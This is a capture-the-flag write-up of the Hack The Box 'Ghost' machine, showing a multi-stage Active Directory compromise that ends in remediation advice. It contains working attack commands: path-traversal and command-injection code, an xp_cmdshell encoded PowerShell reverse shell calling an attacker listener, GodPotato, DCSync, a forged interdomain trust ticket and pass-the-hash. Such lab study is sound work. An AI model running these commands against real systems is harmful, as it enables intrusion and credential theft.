---
title: 'HTB Ghost: Complete Evidence-Led Walkthrough'
description: A multi-layer compromise joining web and DNS flaws to linked SQL Server impersonation, service privilege escalation and a cross-domain trust attack.
date: 2026-11-12
category: Windows / Active Directory
difficulty: Not recorded
tags:
- Hack The Box
- Active Directory
- DNS
- AD FS
- MSSQL
- Impersonation
- Interdomain Trust
published: true
slug: htb-ghost
---

# Overview

**Machine:** Ghost  
**Platform:** Hack The Box  
**Publication format:** htb-ghost.md  

Ghost involved both parent and child Active Directory domains and multiple independent avenues. The documented final compromise used a linked SQL Server and a forged interdomain trust ticket, rather than treating the investigated AD FS path as the successful exploit.

**Documentation standard:** All meaningful stages, verification results, failed leads, command sequences, and operator notes from the uploaded source are retained below. A redacted placeholder means the method was documented but its secret value is intentionally excluded. Reported results and absent terminal evidence remain explicitly qualified.

### Engagement context from the original record

**Author:** Enkidu  
**Date:** 28 October 2026  
**Target:** `10.129.231.105` - `DC01.ghost.htb`  
**Domains:** `ghost.htb` and `corp.ghost.htb`  
**Status:** Completed - parent-domain DCSync achieved and `root.txt` recovered

> **Evidence handling:** All recovered credential material and flag values are redacted; the attack chain and evidence limitations remain documented.

---

### Executive summary

Ghost was a multi-stage compromise involving a custom Ghost CMS content API, intranet source-code review, LDAP-backed authentication, DNS ACL abuse, NetNTLMv2 capture, a gMSA, AD FS, a linked SQL Server, Windows token impersonation, and a cross-domain trust attack.

The final successful chain was:

1. Enumerate web applications and discover the custom Ghost CMS content API and intranet integration.
2. Review the public Gitea repositories and identify a development scan endpoint that interpolated user-controlled input into `bash -c`.
3. Use intranet identity information to identify Florence Ramirez and a DNS-zone ACL granting her `CreateChild`.
4. Use the DNS permission and the missing `bitbucket.ghost.htb` record described in an intranet forum post to capture Justin Bradley's NetNTLMv2 challenge-response and crack it.
5. Retrieve the `adfs_gmsa$` secret and inspect AD FS configuration. A Golden SAML route was investigated, but the retained evidence does not establish it as the successful final route.
6. Enumerate the Ghost Config Panel SQL debugger beyond the visible system databases. The `PRIMARY` linked server mapped the local SQL context to `bridge_corp`, which could impersonate `sa`.
7. Impersonate `sa` on `PRIMARY`, enable `xp_cmdshell`, and obtain a reverse PowerShell shell as `NT SERVICE\MSSQLSERVER`.
8. Use the service account's enabled `SeImpersonatePrivilege` and GodPotato to obtain elevated execution and a Meterpreter session.
9. DCSync `corp.ghost.htb` and recover the `GHOST$` interdomain trust-account hash.
10. Forge an interdomain/referral ticket targeting `krbtgt/ghost.htb`, adding the parent-domain Enterprise Admins SID.
11. Request a CIFS service ticket for `DC01.ghost.htb`, then DCSync the parent domain.
12. Recover the parent-domain Administrator hash, access DC01, and retrieve `root.txt`.

**Critical distinction:** the successful cross-domain step was a forged **interdomain trust ticket using the `GHOST$` trust-account secret**, not simply a same-domain Golden Ticket made with the `corp.ghost.htb` `krbtgt` hash.

## Enumeration

This section documents the initial conditions, observable services, reachable applications and evidence that informed the next action.

### Environment and identifiers

| Item | Value |
|---|---|
| Reachable target | `10.129.231.105` |
| Parent-domain DC | `DC01.ghost.htb` |
| Parent domain | `ghost.htb` |
| Child/trusted domain | `corp.ghost.htb` |
| Child-domain SID | `S-1-5-21-2034262909-2733679486-179904498` |
| Parent-domain SID | `S-1-5-21-4084500788-938703357-3654145966` |
| Parent Enterprise Admins SID | `S-1-5-21-4084500788-938703357-3654145966-519` |
| Attacker VPN IP | `10.10.14.254` |
| Reverse-shell listener | TCP/4444 |
| Linked SQL Server | `PRIMARY` |
| Remote SQL login | `bridge_corp` |
| Main SQL login | `web_client` |
| AD FS gMSA | `adfs_gmsa$` |

The internal SQL host `PRIMARY` and address `10.0.0.10` were not directly reachable from Parrot. The final ticket path therefore used the ticket cache and the reachable parent DC, `10.129.231.105`, rather than assuming all internal hosts were directly accessible.

### Reconnaissance and virtual-host discovery

The target exposed web applications alongside Windows domain services. Relevant names identified during enumeration included:

- `ghost.htb` - Ghost CMS 5.78, exposed through the web front end on port `8008`.
- `gitea.ghost.htb:8008` - Gitea source-code hosting.
- `core.ghost.htb:8443` - core application.
- `federation.ghost.htb` - AD FS.
- `DC01.ghost.htb` - parent-domain DC at `10.129.231.105`.
- `PRIMARY` / `PRIMARY.corp.ghost.htb` - SQL Server associated with `corp.ghost.htb`.

LDAP RootDSE was readable anonymously, while broader subtree queries required an authenticated bind. DNS SOA/NS and LDAP SRV records identified `DC01.ghost.htb`. The core application's `/api/login` flow redirected to the federation service, making AD FS a relevant identity component.

The exact full Nmap output is not preserved in the retained transcript, so this section records only the hostnames and services supported by the session evidence.

## Analysis

Web and intranet enumeration surfaced DNS control and credential-capture opportunities. A recovered identity facilitated further AD FS research, but the decisive privilege transition came from SQL debugger access to a linked server mapping and sa impersonation. The child-domain DCSync yielded the GHOST$ interdomain trust secret, which enabled a referral ticket carrying the parent Enterprise Admins SID and a successful parent-domain DCSync.

### Attack-chain overview

```text
Ghost CMS custom content API
  -> intranet source/configuration discovery
  -> LDAP-backed intranet identities
  -> Florence's DNS CreateChild permission
  -> missing Bitbucket record / NetNTLMv2 capture
  -> justin.bradley credentials
  -> adfs_gmsa$ and AD FS investigation
  -> SQL debugger: web_client -> PRIMARY -> bridge_corp
  -> IMPERSONATE sa -> xp_cmdshell
  -> NT SERVICE\\MSSQLSERVER shell
  -> SeImpersonatePrivilege + GodPotato
  -> DCSync corp.ghost.htb
  -> GHOST$ trust-account secret
  -> forged referral ticket with ghost.htb Enterprise Admins SID
  -> CIFS ticket for DC01
  -> DCSync ghost.htb
  -> Administrator hash / root.txt
```

## Validation

The following is the full technical sequence retained from the uploaded write-up, including commands, outputs, dead ends, corrected tests and the limits of available proof. Section order within this part follows the original investigation.

### Ghost CMS custom content API and file-read weakness

The `ghost-dev/blog` repository contained a custom modification to Ghost's public posts service:

```javascript
const extra = frame.original.query?.extra;
if (extra) {
    const fs = require("fs");
    if (fs.existsSync(extra)) {
        const fileContent = fs.readFileSync(
            "/var/lib/ghost/extra/" + extra,
            { encoding: "utf8" }
        );
        posts.meta.extra = { [extra]: fileContent };
    }
}
```

The check and the read used different paths:

- `fs.existsSync(extra)` checked a user-controlled path relative to the process's working directory.
- `fs.readFileSync("/var/lib/ghost/extra/" + extra)` constructed a second path from a fixed prefix and the same user-controlled value.

That mismatch created a path-traversal/file-read opportunity. The repository README documented the public Ghost API key and stated that `DEV_INTRANET_KEY` was a shared environment variable used between the blog and the intranet integration.

The public API key found in the repository was:

```text
[REDACTED]
```

The custom Dockerfile also created `/var/lib/ghost/extra/important`, containing:

```text
659cdeec9cd6330001baefbf
```

The marker was evidence that the custom file path was reachable. The important security issue was that a public content API parameter influenced filesystem access.

#### Reproduction template

Adjust the base URL if the active virtual-host mapping differs:

```bash
curl -sG 'http://ghost.htb:8008/ghost/api/content/posts/' \
  --data-urlencode 'key=[REDACTED]' \
  --data-urlencode 'extra=../../../../proc/self/environ'
```

The exact value of `DEV_INTRANET_KEY` was not retained in the transcript, so it is not reproduced here.

**Root cause:** the application trusted a caller-controlled path without canonicalizing and constraining the resolved path to an allow-listed directory. Checking one path and reading another made the implementation particularly fragile.

### Intranet source review and command injection

The temporary Gitea account was used to clone both repositories:

```bash
export GITEA='http://gitea.ghost.htb:8008'
export GUSER='gitea_temp_principal'
export GPASS='[REDACTED]'

git clone "http://${GUSER}:${GPASS}@gitea.ghost.htb:8008/ghost-dev/intranet.git"
git clone "http://${GUSER}:${GPASS}@gitea.ghost.htb:8008/ghost-dev/blog.git"
```

The intranet source, `backend/src/api/dev/scan.rs`, contained:

```rust
let result = Command::new("bash")
    .arg("-c")
    .arg(format!("intranet_url_check {}", data.url))
    .output();
```

The JSON `url` field was concatenated into a command string passed to `bash -c`. The response also returned stdout and stderr. The route was guarded by `DevGuard`, which required an `X-DEV-INTRANET-KEY` header matching the `DEV_INTRANET_KEY` environment variable.

This is a command-injection pattern: data that should have remained a URL was interpreted by a shell. A development-only endpoint remained registered in the deployed application, and the implementation exposed command output.

The exact successful initial reverse-shell request is not preserved. The source-level vulnerability and its guard implementation are confirmed, but an exact payload or output should not be invented.

### LDAP-backed intranet identities and clues

The intranet login code performed an LDAP search equivalent to:

```text
(&(displayName=<username>)(intranetSecret=<secret>))
```

This showed that `intranetSecret` was an application-specific LDAP attribute, not necessarily the user's ordinary domain password.

The UI and source exposed useful operational context:

- Intranet pages included `/users`, `/forum`, `/news`, and `/profile`.
- A forum post by `justin.bradley` described a failed connection to `bitbucket.ghost.htb`.
- A reply from `kathryn.holland` said the Bitbucket migration was not ready and the DNS entry had not been configured.
- A migration notice said Gitea domain logins were disabled and `gitea_temp_principal` should be used with its intranet token.

Florence Ramirez's intranet secret was recovered:

```text
User:   florence.ramirez
Secret: [REDACTED]
```

The secret was used to access `LINUX-DEV-WS01`. Session evidence showed UID `50`, groups including `staff` and `it`, and a Kerberos cache at `/tmp/krb5cc_50`. That cache mattered because DNS changes could use GSS-TSIG.

### DNS ACL abuse and Justin Bradley's credentials

A DACL read against the DNS zone object showed that Florence had `CreateChild` permission on the `ghost.htb` zone:

```bash
dacledit.py \
  -action read \
  -target-dn 'DC=ghost.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=ghost,DC=htb' \
  -dc-ip 10.129.231.105 \
  'ghost.htb/intranet_principal:[REDACTED]'
```

The relevant ACE was:

```text
Access mask : CreateChild (0x1)
Trustee     : florence.ramirez
```

The credential used for the ACL query was:

```text
User:     intranet_principal
Password: [REDACTED]
```

The attack connected three separate observations: the missing Bitbucket DNS record, the forum discussion predicting service access, and Florence's permission to create DNS children.

The chain was:

1. Authenticate with Florence's intranet secret.
2. Use the workstation's Kerberos cache for an authenticated DNS update.
3. Create or redirect the missing Bitbucket name to the controlled lab listener.
4. Capture the resulting NetNTLMv2 challenge-response.
5. Crack it offline and test the recovered password against in-scope services.

The raw NetNTLMv2 line and exact successful `nsupdate` command were not retained. The resulting credential was recorded as:

```text
User:     justin.bradley
Password: [REDACTED]
```

The credential was used for Windows access through WinRM. The expected command form was:

```bash
evil-winrm -i dc01.ghost.htb \
  -u 'justin.bradley' \
  -p '<REDACTED>'
```

Use the active instance's reachable hostname/IP if it differs.

**Lesson:** a missing DNS record can become an attack surface when a user with DNS write rights can create it. The forum post made the ACL actionable by identifying the exact service name to investigate.

### gMSA access and AD FS investigation

The `adfs_gmsa$` account was identified and its managed secret recovered. The NTLM hash recorded during the engagement was:

```text
adfs_gmsa$: [REDACTED_HEX]
```

A TGT was obtained and stored in a Kerberos cache. `klist` showed `adfs_gmsa$@GHOST.HTB` and a `krbtgt/GHOST.HTB@GHOST.HTB` ticket. The exact gMSA retrieval command was not retained, so the report records the confirmed hash/cache result instead of guessing which retrieval command was used.

AD FS configuration objects were found beneath:

```text
CN=ADFS,CN=Microsoft,CN=Program Data,DC=ghost,DC=htb
```

An LDAP subtree query returned UUID-named containers, `CryptoPolicy` objects, and related attributes. `ADFSDump.exe` was run on the Windows host:

```powershell
.\ADFSDump.exe | Tee-Object .\adfsdump.txt
```

The tool reported:

- Domain: `ghost.htb`
- DKM/private-key material
- An encrypted token-signing-key blob
- Certificate thumbprint: `[REDACTED_HEX]`
- Store location: `CurrentUser`
- Store name: `My`
- Issuer: `http://federation.ghost.htb/adfs/services/trust`
- AD FS 2019
- Relying party: `core.ghost.htb`
- SAML endpoint: `https://core.ghost.htb:8443/adfs/saml/postResponse`

The relying-party trust was enabled, used RSA-SHA256 signatures, and mapped the Windows account-name claim to UPN and common-name claims.

#### Extracting key material

`adfsdump.txt` was UTF-16 little-endian. It was converted before extracting the encrypted token-signing-key blob:

```bash
if file adfsdump.txt | grep -qi 'UTF-16'; then
    iconv -f UTF-16LE -t UTF-8 adfsdump.txt > adfsdump-utf8.txt
else
    cp adfsdump.txt adfsdump-utf8.txt
fi

awk '
/Encrypted Token Signing Key Begin/ {capture=1; next}
/Encrypted Token Signing Key End/   {capture=0}
capture
' adfsdump-utf8.txt |
tr -d '[:space:]' |
base64 -d > TKSKey.bin
```

The recorded artifacts were:

```text
TKSKey.bin   4371 bytes
DKMkey.bin     32 bytes
```

A `golden-saml.txt` file was generated during this parallel investigation. The retained evidence does not show a verified successful Golden SAML login, and this route was not required for the final confirmed chain.

#### Kerberos troubleshooting

`kvno ldap/dc01.ghost.htb` and `ldapsearch -Y GSSAPI` failed with:

```text
Cannot find KDC for realm "GHOST.HTB"
```

That indicated a local Kerberos realm/KDC discovery or configuration problem. It did not, by itself, prove that the gMSA credential or ticket was invalid. A cache existed, but the local Kerberos tools could not locate the KDC for the requested realm. Realm mapping, DNS SRV resolution, `/etc/hosts`, and `krb5.conf` needed to be checked before interpreting the failure as an authentication failure.

### SQL debugger: enumerate beyond the visible databases

The Ghost Config Panel exposed a Database Debug query interface. The initial SQL context reported:

```text
SQL Server 2022 (RTM) - 16.0.1000.6
Current database: master
Login: web_client
Effective login: web_client
is_sysadmin: 0
```

Only the four system databases were visible:

```text
master
tempdb
model
msdb
```

The login was not database owner and lacked `VIEW DEFINITION`. That was not a reason to stop.

#### Linked-server enumeration

The linked-server output showed:

```text
DC01     is_linked = false
PRIMARY  is_linked = true
```

`PRIMARY` had data access and RPC OUT enabled. The linked-login mapping showed:

```text
linked_server        PRIMARY
local_principal_id   266
uses_self_credential false
remote_name          bridge_corp
```

The mapping established that the main `web_client` context could reach `PRIMARY` through the remote login `bridge_corp`.

#### Remote identity and impersonation permission

The remote server reported `bridge_corp` as its current login, with `is_sysadmin = 0`. The important server permission was:

```text
grantee: bridge_corp
class_desc: SERVER_PRINCIPAL
permission_name: IMPERSONATE
state_desc: GRANT
impersonation_target: sa
target_type: SQL_LOGIN
target_is_sysadmin: 1
```

The effective identity changed to `sa` when impersonation was tested, and `IS_SRVROLEMEMBER('sysadmin')` returned `1`.

This was the pivot: `bridge_corp` did not need to be a sysadmin directly because it was permitted to impersonate `sa`.

#### Useful SQL enumeration queries

Adapt to the query panel's restrictions, but retain these checks in the enumeration playbook:

```sql
SELECT
    @@VERSION AS version,
    DB_NAME() AS current_database,
    SUSER_SNAME() AS login_name,
    ORIGINAL_LOGIN() AS original_login,
    IS_SRVROLEMEMBER('sysadmin') AS is_sysadmin;

EXEC sp_linkedservers;

SELECT
    name, product, provider, data_source,
    is_linked, is_data_access_enabled, is_rpc_out_enabled
FROM sys.servers;

SELECT
    s.name AS linked_server,
    ll.local_principal_id,
    ll.uses_self_credential,
    ll.remote_name
FROM sys.linked_logins AS ll
JOIN sys.servers AS s ON s.server_id = ll.server_id;

SELECT
    grantee.name AS grantee,
    perm.permission_name,
    perm.state_desc,
    target.name AS impersonation_target,
    target.type_desc AS target_type,
    target.is_disabled
FROM sys.server_permissions AS perm
JOIN sys.server_principals AS grantee
    ON perm.grantee_principal_id = grantee.principal_id
LEFT JOIN sys.server_principals AS target
    ON perm.major_id = target.principal_id
WHERE perm.permission_name = 'IMPERSONATE';
```

The exact joins can vary by SQL Server version and panel behavior. The objective is to enumerate linked servers, remote login mappings, impersonation grants, and effective identities.

### `sa` impersonation, `xp_cmdshell`, and reverse shell

The linked server was used to execute a remote batch. It impersonated `sa`, enabled advanced options and `xp_cmdshell`, then ran `whoami`:

```sql
EXEC (
    'EXECUTE AS LOGIN = ''sa'';
     EXEC sp_configure ''show advanced options'', 1;
     RECONFIGURE;
     EXEC sp_configure ''xp_cmdshell'', 1;
     RECONFIGURE;
     EXEC master..xp_cmdshell ''whoami'';
     REVERT;'
) AT [PRIMARY];
```

The OS identity returned was:

```text
nt service\mssqlserver
```

SQL-level impersonation did not change the Windows identity used by the SQL Server service process. `xp_cmdshell` ran as `NT SERVICE\MSSQLSERVER`.

#### The `CreateProcess` error

A file-download attempt returned:

```text
RequestError: An error occurred during the execution of xp_cmdshell.
A call to 'CreateProcess' failed with error code: '5'.
```

Error code 5 indicates access denied during process creation. Since `whoami` had already worked, this was not proof that the linked-server path was dead. The approach changed to a self-contained PowerShell TCP callback rather than continuing to debug the download command.

#### Encoding the PowerShell callback

The callback listener used Parrot's VPN IP `10.10.14.254` on TCP/4444. The script was saved as `/tmp/ghost-shell.ps1`. PowerShell's `-EncodedCommand` expects Base64 of UTF-16LE text, not UTF-8:

```bash
python3 - <<'PY'
import base64
from pathlib import Path

script = Path("/tmp/ghost-shell.ps1").read_text()
encoded = base64.b64encode(script.encode("utf-16le")).decode()
print(encoded)
PY
```

The generated Base64 was placed inside the remote batch:

```sql
EXEC (
    'EXECUTE AS LOGIN = ''sa'';
     EXEC master..xp_cmdshell
     ''powershell.exe -NoProfile -NonInteractive -EncodedCommand <BASE64_PAYLOAD>'';
     REVERT;'
) AT [PRIMARY];
```

`<BASE64_PAYLOAD>` is a placeholder for the generated value.

Start the listener first:

```bash
rlwrap nc -lvnp 4444
```

The listener received a connection from `10.129.231.105` and returned a PowerShell prompt at `C:\Windows\system32`.

The shell confirmed:

```powershell
whoami
whoami /priv
```

The important enabled privilege was:

```text
SeImpersonatePrivilege    Enabled
```

That created the local privilege-escalation opportunity.

### GodPotato and elevated execution

GodPotato was selected because `NT SERVICE\MSSQLSERVER` had `SeImpersonatePrivilege` enabled. The first invocation failed:

```powershell
C:\ProgramData\gp.exe -cmd "cmd /c whoami"
```

PowerShell returned `CommandNotFoundException`, saying `C:\ProgramData\gp.exe` was not recognized. This was a remote path/file-presence problem, not proof that the impersonation technique had failed.

The correct troubleshooting sequence was to verify that the executable existed on the target and confirm the exact filename/path before running it. A file downloaded to Parrot is not automatically present on Windows. The final session used GodPotato to obtain a Meterpreter session and proceed with privileged operations.

The exact successful GodPotato payload invocation was not preserved in the transcript, so it is not reconstructed as though it were observed.

### DCSync against `corp.ghost.htb`

The child/trusted domain SID was:

```text
S-1-5-21-2034262909-2733679486-179904498
```

A Mimikatz DCSync operation was run:

```text
lsadump::dcsync /all /csv
```

The output identified `PRIMARY.corp.ghost.htb` as the domain controller. Key values recovered were:

```text
corp.ghost.htb Administrator NTLM:
[REDACTED_HEX]

corp.ghost.htb krbtgt NTLM:
[REDACTED_HEX]

GHOST$ trust-account NTLM used in the successful ticket:
[REDACTED_HEX]
```

The trust-account hash was the critical value for the final cross-domain path.

#### Hash discrepancy preserved from the session

An earlier attempt used this `GHOST$` value:

```text
[REDACTED_HEX]
```

A ticket was generated, but the subsequent service-ticket request failed with:

```text
KRB_AP_ERR_BAD_INTEGRITY
```

The successful ticket used the later verified value:

```text
[REDACTED_HEX]
```

The transcript contains both values from different stages/dumps. Do not assume they are interchangeable or guess why they differed. Operationally, the first attempt failed integrity validation and the second value passed the next protocol step.

### Forging the interdomain trust ticket

An early attempt used the `corp.ghost.htb` `krbtgt` hash to create a same-domain Golden Ticket through Meterpreter's Kiwi commands. The tool reported:

```text
[+] Golden Kerberos ticket written to C:WindowsTempcorp_admin.kirbi
```

The subsequent `kerberos_ticket_use` and download attempts failed because the file could not be found. The path output lacked normal separators, and the ticket was not available where the client expected it.

More importantly, a same-domain Golden Ticket signed with the child domain's `krbtgt` key was not the right artifact for crossing into `ghost.htb`. The final working route used the `GHOST$` interdomain trust-account key and targeted `krbtgt/ghost.htb`.

```bash
impacket-ticketer \
  -nthash [REDACTED_HEX] \
  -domain-sid S-1-5-21-2034262909-2733679486-179904498 \
  -domain corp.ghost.htb \
  -extra-sid S-1-5-21-4084500788-938703357-3654145966-519 \
  -spn krbtgt/ghost.htb \
  moonman
```

The ticket was saved as `moonman.ccache`.

- `-nthash`: the `GHOST$` trust secret that worked.
- `-domain-sid`: SID for `corp.ghost.htb`.
- `-domain`: `corp.ghost.htb`.
- `-extra-sid`: parent-domain Enterprise Admins SID (parent SID plus RID `519`).
- `-spn krbtgt/ghost.htb`: targets the parent realm, creating a referral/interdomain ticket.
- `moonman`: dummy principal name used in the forged ticket.

This is often loosely called a “Golden Ticket across domains,” but the technical distinction matters. The successful artifact was a forged interdomain/referral ticket using the trust secret, with the parent Enterprise Admins SID inserted into the PAC.

### Requesting a CIFS ticket for DC01

The successful service-ticket request was:

```bash
KRB5CCNAME=moonman.ccache \
  impacket-getST \
  -k -no-pass \
  -spn cifs/dc01.ghost.htb \
  ghost.htb/moonman
```

Impacket saved:

```text
moonman@cifs_dc01.ghost.htb@GHOST.HTB.ccache
```

This validated that the forged referral ticket could request a service ticket in the parent domain.

#### Kerberos command mistakes

Several attempts failed for avoidable reasons:

1. **Typo:** `KB5CCNAME` was typed instead of `KRB5CCNAME`, so the intended cache was not selected.
2. **Wrong cache:** `enkidu.ccache` contained a referral ticket but was used as though it were an ordinary user credential. Impacket then attempted to obtain a TGT from `CORP.GHOST.HTB` and failed KDC/DNS discovery.
3. **Unsupported option:** the installed Impacket 0.12.0 `getST.py` rejected `-target-domain`. Use the options supported by the installed version.
4. **Mismatched identity/realm:** the successful form used `ghost.htb/moonman` with SPN `cifs/dc01.ghost.htb`.
5. **Unreachable internal address:** `10.0.0.10` was not directly reachable from Parrot. The successful ticket request did not require hard-coding that unreachable address; the later DCSync used `10.129.231.105`.
6. **Wrong/stale trust hash:** `ce0fc4...` failed integrity validation; `e4d3...` succeeded.

When Kerberos fails, separate cache selection, ticket type, SPN, realm/KDC resolution, clock skew, and the key used to sign/encrypt the ticket. A `klist` entry alone does not prove that the ticket can obtain the target service ticket.

### DCSync against `ghost.htb`

With the CIFS ticket in the cache, Impacket was used against the parent DC:

```bash
KRB5CCNAME=moonman@cifs_dc01.ghost.htb@GHOST.HTB.ccache \
  impacket-secretsdump \
  -k -no-pass \
  -just-dc \
  -dc-ip 10.129.231.105 \
  dc01.ghost.htb
```

The operation completed using DRSUAPI and returned parent-domain credential material. The most important hashes were:

```text
ghost.htb Administrator NTLM:
[REDACTED_HEX]

ghost.htb krbtgt NTLM:
[REDACTED_HEX]
```

The DCSync output also contained the following parent-domain NTLM hashes:

```text
Administrator         [REDACTED_HEX]
Guest                 [REDACTED_HEX]
krbtgt                [REDACTED_HEX]
kathryn.holland       [REDACTED_HEX]
cassandra.shelton     [REDACTED_HEX]
robert.steeves        [REDACTED_HEX]
florence.ramirez      [REDACTED_HEX]
justin.bradley        [REDACTED_HEX]
arthur.boyd           [REDACTED_HEX]
beth.clark            [REDACTED_HEX]
charles.gray          [REDACTED_HEX]
jason.taylor          [REDACTED_HEX]
intranet_principal    [REDACTED_HEX]
gitea_temp_principal  [REDACTED_HEX]
DC01$                 [REDACTED_HEX]
LINUX-DEV-WS01$       [REDACTED_HEX]
adfs_gmsa$            [REDACTED_HEX]
GHOST-CORP$           [REDACTED_HEX]
```

The command also returned AES keys for accounts; they are not duplicated here because the attack path required the NTLM values above and the raw output remains in the session log.

### Final access and proof

The parent-domain Administrator hash was used for pass-the-hash PsExec:

```bash
impacket-psexec \
  -hashes '[REDACTED_HEX]:[REDACTED_HEX]' \
  'ghost.htb/Administrator@10.129.231.105'
```

After connection, verify the execution context and read the proof:

```cmd
whoami
hostname
type C:\Users\Administrator\Desktop\root.txt
```

The engagement was completed and `root.txt` was recovered. Its literal value was not present in the retained transcript, so it is not fabricated here.

### Troubleshooting and mistakes - lessons to carry forward

#### SQL enumeration
- Do not stop because only the four system databases are visible or because the current login is not sysadmin.
- Enumerate linked servers, remote login mappings, RPC settings, server permissions, impersonation, and effective identities.
- The `PRIMARY` mapping and `IMPERSONATE sa` permission were the actual SQL pivot.

#### SQL identity versus Windows identity
- `EXECUTE AS LOGIN = 'sa'` elevated the SQL context but did not change the Windows service identity.
- `xp_cmdshell` ran as `NT SERVICE\MSSQLSERVER`.
- Always run `whoami` and `whoami /priv` from OS command execution.

#### `CreateProcess` error 5
- It happened during a file-download attempt.
- Because `whoami` had already worked, it was a command/path/permission clue, not a reason to abandon the linked server.
- The successful callback approach used a self-contained encoded PowerShell command.

#### GodPotato path error
- `C:\ProgramData\gp.exe` was not recognized because the file/path was not present as expected.
- A file on Parrot is not automatically on Windows.
- Verify the remote path with `Test-Path`, `Get-Item`, or `dir` before executing it.

#### PowerShell encoding
- The first `-EncodedCommand` attempt was rejected.
- PowerShell expected Base64 of UTF-16LE text, not UTF-8.

#### Kerberos cache handling
- Use `KRB5CCNAME`, not the mistyped `KB5CCNAME`.
- Confirm the exact cache file with `KRB5CCNAME=/path/to/file klist`.
- Inspect the default principal and service principal.
- Confirm the requested SPN and target realm.
- Do not assume a valid-looking cache can request every service ticket.

#### Trust ticket versus Golden Ticket
- A same-domain Golden Ticket normally uses the domain's `krbtgt` key.
- This successful route used the `GHOST$` trust-account key, the `krbtgt/ghost.htb` SPN, and the parent Enterprise Admins SID.
- Keep the account, domain, SID, and key provenance explicit.

#### Wrong trust hash
- The `ce0fc4...` attempt failed with `KRB_AP_ERR_BAD_INTEGRITY`.
- The `e4d3...` value succeeded.
- Preserve both as historical evidence, but mark the successful one clearly.

#### Unreachable internal KDC
- `10.0.0.10` was not directly reachable from Parrot.
- Use the reachable DC and correct SPN/cache combination instead of assuming internal network routes exist.

#### Credential reuse
- Test recovered passwords, hashes, tokens, and keys against relevant in-scope services.
- Track each result and provenance rather than assuming credentials are service-specific.

## Impact

The source records completion through the parent-domain Administrator hash, final access and recovery of root.txt. The AD FS Golden SAML route remains an investigated branch, not the established completion method.

### Credential and artifact ledger

These values are included because this is the complete lab write-up. Do not reuse them outside the authorized target.

| Account / artifact | Value | Purpose |
|---|---|---|
| `gitea_temp_principal` | `[REDACTED]` | Clone intranet/blog repositories |
| `intranet_principal` | `[REDACTED]` | Authenticated DNS ACL enumeration |
| Florence intranet secret | `[REDACTED]` | Intranet and Linux workstation access |
| `justin.bradley` | `[REDACTED]` | Cracked from NetNTLMv2; Windows access |
| `adfs_gmsa$` NTLM | `[REDACTED_HEX]` | AD FS service identity |
| Child Administrator NTLM | `[REDACTED_HEX]` | `corp.ghost.htb` DCSync |
| Child `krbtgt` NTLM | `[REDACTED_HEX]` | Same-domain ticket investigation |
| `GHOST$` trust NTLM, earlier | `[REDACTED_HEX]` | Earlier failed ticket attempt |
| `GHOST$` trust NTLM, successful | `[REDACTED_HEX]` | Final interdomain referral ticket |
| Parent Administrator NTLM | `[REDACTED_HEX]` | Final PsExec pass-the-hash |
| Parent `krbtgt` NTLM | `[REDACTED_HEX]` | Parent DCSync result |
| `moonman.ccache` | Forged referral ticket | Request parent CIFS ticket |
| `moonman@cifs_dc01.ghost.htb@GHOST.HTB.ccache` | CIFS service ticket | Parent-domain DCSync |
| `TKSKey.bin` | 4371 bytes | Encrypted AD FS token-signing-key blob |
| `DKMkey.bin` | 32 bytes | AD FS DKM/private-key material |
| `adfsdump.txt` | UTF-16LE output | Raw ADFSDump evidence |
| `golden-saml.txt` | 4.8 KB | AD FS side investigation; successful use not confirmed |
| `/tmp/ghost-shell.ps1` | PowerShell callback script | SQL `xp_cmdshell` reverse shell |
| `/tmp/ghost-shell-query.sql` | Generated SQL wrapper | Encoded callback through `PRIMARY` |

## Remediation

The defensive recommendations and operational lessons below address the demonstrated weaknesses. They follow the original source material instead of inferring additional compromise.

### Impact and remediation

#### Impact

The chain crossed multiple control boundaries:

- A public content API exposed a filesystem-read weakness.
- A development endpoint passed user input to `bash -c`.
- An intranet user had DNS-zone child-creation rights.
- A missing DNS record could be created and used to capture a user's challenge-response.
- A low-privileged SQL login could reach a linked server with a remote mapping.
- The remote login could impersonate `sa` and execute OS commands.
- The SQL service identity had `SeImpersonatePrivilege`.
- Compromise of the trusted domain exposed the interdomain trust secret.
- A forged referral ticket yielded a parent-domain CIFS ticket and DCSync access.

The final result was parent-domain credential-database compromise, including Administrator and `krbtgt` material, and recovery of the root proof.

#### Web and application
1. Remove the custom file-read logic from the Ghost public content API.
2. Canonicalize resolved paths and enforce a strict allow-listed directory.
3. Never interpolate user-controlled input into `bash -c`; use a fixed executable and structured arguments.
4. Remove development routes from production builds and avoid returning command output.
5. Rotate `DEV_INTRANET_KEY`; keep it out of repositories, logs, and public-facing containers.
6. Review Gitea temporary accounts, repository permissions, and secret storage.

#### Identity, LDAP, and DNS
1. Remove unnecessary `CreateChild` permissions from the DNS zone.
2. Separate intranet secrets from domain credentials and apply least privilege to LDAP attributes.
3. Restrict gMSA managed-password read rights to approved principals.
4. Monitor DNS record creation and unexpected changes to service names.
5. Restrict NTLM where feasible and enable protections against relay and challenge-response capture.

#### SQL Server
1. Remove unnecessary linked servers and disable RPC OUT when not required.
2. Review linked-login mappings and eliminate shared remote identities where possible.
3. Remove `IMPERSONATE` on `sa` from non-administrative logins.
4. Keep `xp_cmdshell` disabled unless there is a documented business requirement; alert on enablement.
5. Run SQL Server under a dedicated least-privileged service identity and remove unnecessary privileges such as `SeImpersonatePrivilege` where supported.
6. Audit SQL service account permissions on local folders and prevent arbitrary executable staging in writable directories.

#### Active Directory and trust
1. Treat the `GHOST$` trust secret as highly sensitive; rotate trust secrets after compromise and validate the trust configuration.
2. Review the bidirectional trust and minimize principals that can affect privileged groups across the boundary.
3. Monitor Kerberos referrals, unusual service-ticket requests, PAC SID anomalies, and DRSUAPI/DCSync activity.
4. Restrict replication rights to domain controllers and explicitly approved directory-sync identities.
5. After trust-ticket compromise, rotate affected privileged credentials, including `krbtgt` using the supported two-reset procedure with replication and ticket-lifetime planning.
6. Audit AD FS signing keys, DKM material, relying-party rules, and service-account access; rotate compromised federation material as part of recovery.

### Final takeaways

- **Enumerate databases and linked servers even when the current SQL login is low privilege.**
- **Track every identity boundary:** application user, domain user, SQL login, remote SQL login, Windows service identity, and Kerberos principal are not interchangeable.
- **Check Windows token privileges after every shell.** `SeImpersonatePrivilege` was the bridge from SQL service execution to elevated access.
- **Track credential provenance.** The wrong trust hash caused an integrity failure; the later verified hash succeeded.
- **Validate tickets by using them.** A cache entry alone is not proof that the target service will accept it.
- **Distinguish Golden Tickets from interdomain trust tickets.** The final route used the trust account and the parent Enterprise Admins SID.
